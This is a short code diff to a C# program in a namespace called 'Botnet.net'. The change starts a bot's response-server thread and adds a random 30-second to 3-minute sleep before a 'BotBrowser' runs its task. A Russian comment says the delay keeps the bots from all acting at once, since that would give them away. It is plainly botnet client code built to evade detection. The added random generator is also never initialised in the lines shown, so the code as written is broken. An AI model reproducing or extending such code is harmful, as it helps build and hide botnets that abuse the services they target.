@@ -11,6 +11,7 @@ namespace Botnet.net
     static class Program
     {
         public static Thread ResponseServer { get; set; }
+        public static Random rnd { get; set; }
         /// <summary>
         /// Главная точка входа для приложения.
         /// </summary>
@@ -37,8 +38,12 @@ namespace Botnet.net
                             }
                     });
                     ResponseServer.IsBackground = true;
+                    ResponseServer.Start();
+
+                    Thread.Sleep(rnd.Next(30000, 180000));// Бот спит от 30 секунд до 3 минут, чтобы после получения задания боты не рынули все сразу т.к. это палевно
 
                     BotBrowser bot = new BotBrowser(task);
+
                     System.Threading.Thread closeApp = new System.Threading.Thread(() =>
                     {
                         bot.SleepToSession();
@@ -47,6 +52,7 @@ namespace Botnet.net
                     });
                     closeApp.IsBackground = true;
                     closeApp.Start();
+
                     Application.Run(bot);
 
                 }
